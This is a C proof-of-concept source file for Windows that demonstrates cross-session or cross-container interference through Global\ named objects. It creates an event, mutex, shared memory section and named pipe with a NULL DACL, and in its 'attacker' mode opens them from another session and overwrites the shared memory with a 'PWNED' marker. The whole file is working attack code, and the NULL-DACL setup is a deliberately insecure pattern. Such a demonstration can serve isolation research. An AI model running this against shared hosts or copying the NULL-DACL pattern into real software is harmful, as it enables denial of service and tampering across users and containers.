/*
 * poc2_global_ns_interference.c — Global\ Namespace Interference Attack
 *
 * Demonstrates that two processes in different sessions (or simulating
 * two containers on the same host) can interfere with each other through
 * the Global\ namespace.
 *
 * Most containerized apps don't realize that named objects created with
 * Global\ prefix are visible from EVERY session and container on the
 * machine. This enables:
 *   - Process A in Container 1 creates "Global\MyLicenseCheck"
 *   - Process B in Container 2 can open and signal/close that event
 *   - Result: container-escape-adjacent denial of service or info leak
 *
 * Build: gcc -o poc2_global_ns_interference.exe poc2_global_ns_interference.c
 * Run:   poc2_global_ns_interference.exe
 *        (launch a second instance to demonstrate interference)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <string.h>

#define GLOBAL_EVENT_NAME  L"Global\\POC2_CrossSession_EvilEvent_20260725"
#define GLOBAL_PIPE_NAME   L"\\\\.\\pipe\\Global\\POC2_CrossSession_EvilPipe_20260725"
#define GLOBAL_MUTEX_NAME  L"Global\\POC2_CrossSession_EvilMutex_20260725"
#define GLOBAL_FILE_MAP    L"Global\\POC2_CrossSession_EvilSection_20260725"

static int g_owning = 0;
static HANDLE g_events[3] = {0};
static HANDLE g_mutex = NULL;
static HANDLE g_section = NULL;

static void create_global_objects() {
    SECURITY_DESCRIPTOR sd;
    SECURITY_ATTRIBUTES sa;
    HANDLE h;

    /* Minimal security descriptor that allows ALL access */
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE); /* NULL DACL = everyone has full access */
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = &sd;
    sa.bInheritHandle = FALSE;

    printf("[*] Creating named objects with NULL DACL (worst case)...\n");

    /* Event — manual-reset, initially nonsignaled */
    h = CreateEventW(&sa, TRUE, FALSE, GLOBAL_EVENT_NAME);
    if (h) {
        printf("  [+] Global Event:   %ls\n", GLOBAL_EVENT_NAME);
        g_events[0] = h;
    } else {
        printf("  [-] Event creation failed: %lu\n", GetLastError());
        /* Might already exist — try to open it */
        h = OpenEventW(EVENT_ALL_ACCESS, FALSE, GLOBAL_EVENT_NAME);
        if (h) {
            printf("  [~] Opened existing Global Event\n");
            g_events[0] = h;
            g_owning = 1; /* we're the attacker */
        }
    }

    /* Mutex */
    h = CreateMutexW(&sa, FALSE, GLOBAL_MUTEX_NAME);
    if (h) {
        printf("  [+] Global Mutex:   %ls\n", GLOBAL_MUTEX_NAME);
        g_mutex = h;
    } else {
        printf("  [-] Mutex creation failed: %lu\n", GetLastError());
        h = OpenMutexW(MUTEX_ALL_ACCESS, FALSE, GLOBAL_MUTEX_NAME);
        if (h) {
            printf("  [~] Opened existing Global Mutex\n");
            g_mutex = h;
            g_owning = 1;
        }
    }

    /* File mapping (shared memory section) */
    h = CreateFileMappingW(INVALID_HANDLE_VALUE, &sa,
                           PAGE_READWRITE, 0, 4096, GLOBAL_FILE_MAP);
    if (h) {
        printf("  [+] Global Section: %ls (4 KB)\n", GLOBAL_FILE_MAP);
        g_section = h;
    } else {
        printf("  [-] Section creation failed: %lu\n", GetLastError());
        h = OpenFileMappingW(FILE_MAP_ALL_ACCESS, FALSE, GLOBAL_FILE_MAP);
        if (h) {
            printf("  [~] Opened existing Global Section\n");
            g_section = h;
            g_owning = 1;
        }
    }

    /* Named pipe */
    h = CreateNamedPipeW(GLOBAL_PIPE_NAME,
                         PIPE_ACCESS_DUPLEX,
                         PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                         1, 4096, 4096, 0, &sa);
    if (h != INVALID_HANDLE_VALUE) {
        printf("  [+] Global Pipe:    %ls\n", GLOBAL_PIPE_NAME);
        /* Leave pipe handle open; we won't use it in this PoC */
    } else {
        printf("  [-] Pipe creation failed: %lu (may already exist)\n", GetLastError());
    }
}

static void enumerate_global_ns() {
    /* We can't enumerate the Global\ directory directly from user-mode
     * without NtOpenDirectoryObject, but we can *test* which names exist
     * by trying to open each one. */
    HANDLE h;
    int found = 0;

    printf("\n[*] Testing accessibility of Global\\ objects from this process:\n");

    h = OpenEventW(EVENT_ALL_ACCESS, FALSE, GLOBAL_EVENT_NAME);
    if (h) {
        printf("  [+] Event accessible:        EVENT_ALL_ACCESS\n");
        CloseHandle(h);
        found++;
    } else {
        printf("  [-] Event: access denied (%lu)\n", GetLastError());
    }

    h = OpenMutexW(MUTEX_ALL_ACCESS, FALSE, GLOBAL_MUTEX_NAME);
    if (h) {
        printf("  [+] Mutex accessible:        MUTEX_ALL_ACCESS\n");
        CloseHandle(h);
        found++;
    } else {
        printf("  [-] Mutex: access denied (%lu)\n", GetLastError());
    }

    h = OpenSemaphoreW(SEMAPHORE_ALL_ACCESS, FALSE, L"Global\\POC2_Sem_Evil");
    if (h) {
        printf("  [+] Semaphore accessible:    SEMAPHORE_ALL_ACCESS (leftover)\n");
        CloseHandle(h);
    }

    /* Try to write to the shared section */
    h = OpenFileMappingW(FILE_MAP_ALL_ACCESS, FALSE, GLOBAL_FILE_MAP);
    if (h) {
        void *map = MapViewOfFile(h, FILE_MAP_ALL_ACCESS, 0, 0, 256);
        if (map) {
            char buf[256] = {0};
            memcpy(buf, map, 256);
            printf("  [+] Section accessible:      FILE_MAP_ALL_ACCESS\n");
            printf("  [+] Section content: \"%.100s\"\n", buf);

            /* Try to write to it */
            memcpy(map, "PWNED_BY_SESSION_", 17);
            printf("  [+] Wrote marker to shared section! Content modified cross-session.\n");
            UnmapViewOfFile(map);
        }
        CloseHandle(h);
        found++;
    } else {
        printf("  [-] Section: access denied (%lu)\n", GetLastError());
    }

    if (found == 0) {
        printf("\n  [!] No Global objects found. Run another instance of this PoC first.\n");
    }
}

static int hello_thread() {
    /* If we own the objects, pulse the event periodically */
    if (g_events[0]) {
        SetEvent(g_events[0]);
        Sleep(100);
        ResetEvent(g_events[0]);
    }
    return 0;
}

int main(int argc, char *argv[]) {
    DWORD myPid = GetCurrentProcessId();
    DWORD mySession;
    ProcessIdToSessionId(myPid, &mySession);

    printf("=== PoC 2: Global\\ Namespace Interference ===\n");
    printf("    PID: %lu  Session: %lu\n\n", myPid, mySession);
    printf("    This PoC demonstrates that Global\\ named objects are\n");
    printf("    shared across ALL sessions on the machine — there is\n");
    printf("    NO container/session isolation at this level.\n\n");

    if (argc > 1 && strcmp(argv[1], "own") == 0) {
        /* First instance: create the objects */
        printf("[MODE] Object Owner\n");
        printf("       Creating Global\\ named objects...\n\n");
        create_global_objects();
        printf("\n[*] Objects created. Run another instance of this PoC in\n");
        printf("    a DIFFERENT session (e.g. via 'runas /user:...' or\n");
        printf("    a scheduled task) to see cross-session interference.\n");
        printf("\n[*] Press any key to test cross-session access...\n");
        getchar();
        enumerate_global_ns();
        printf("\n[*] Sleeping 30s so you can probe from another session...\n");
        Sleep(30000);
    } else {
        /* Attacker instance: try to open and modify cross-session objects */
        printf("[MODE] Attacker\n");
        printf("       Trying to access Global\\ objects created by another session...\n\n");
        enumerate_global_ns();
    }

    /* Cleanup */
    if (g_events[0]) CloseHandle(g_events[0]);
    if (g_mutex)     CloseHandle(g_mutex);
    if (g_section)   CloseHandle(g_section);

    printf("\n=== Demonstration Complete ===\n");
    return 0;
}
